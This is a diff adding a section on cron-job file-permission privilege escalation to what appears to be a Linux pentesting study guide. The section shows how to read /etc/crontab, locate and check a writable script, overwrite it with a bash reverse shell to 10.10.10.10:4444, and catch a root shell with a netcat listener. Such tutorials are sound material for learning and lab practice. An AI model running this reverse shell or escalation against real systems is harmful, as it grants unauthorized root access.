@@ -65,6 +65,21 @@ void _init() {
 }
 ```
 
+## Cron Jobs - File Permissions
 
+Cron jobs are programs or script users schedule to run at specific time or intervals. 
 
+Viewing the contents of the system crontab using ```cat /etc/crontab```, we can view the scheduled cron jobs and in this system, there is a bash script scheduled to run every minute. locating the script using ```locate overwrite.sh```, in order to modify the script. Before modifying the script, running ```ls -l /usr/local/bin/overwrite.sh``` command tells which user can edit it. If it is editable by the current user, then it should be modified with the below script
 
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+```
+
+The IP address in the script should be changed to your current IP address that can be gotten through ifconfig command on linux & mac and ipconfig on windows. After modifying the script, we would open a netcat listener using the below command which would give us a root shell after a few minute.
+
+```nc -nvlp 4444```
+
+Note: the port (4444) should be the same for both your bash script on the target machine and the netcat listner on your local machine
+
+## Cron Jobs - Wildcards
